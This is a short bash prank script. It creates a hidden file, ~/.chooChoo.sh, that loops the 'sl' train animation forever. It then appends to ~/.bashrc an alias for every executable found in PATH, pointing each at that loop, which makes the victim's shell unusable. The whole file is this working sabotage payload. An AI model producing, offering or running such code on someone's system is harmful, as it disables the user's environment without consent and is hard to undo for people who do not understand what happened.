#!/bin/bash

chooChoo="$HOME/.chooChoo.sh";
echo "#!/bin/bash" 	> $chooChoo;
echo "while :" 		>> $chooChoo;
echo "do"			>> $chooChoo;
echo "	sl;" 		>> $chooChoo;
echo "done" 		>> $chooChoo;
chmod a+x $chooChoo;

for dir in $(echo $PATH | tr ':' ' ')
do
  for file in $dir/*
  do
    echo alias $(basename $file)=$chooChoo >> ~/.bashrc
  done
done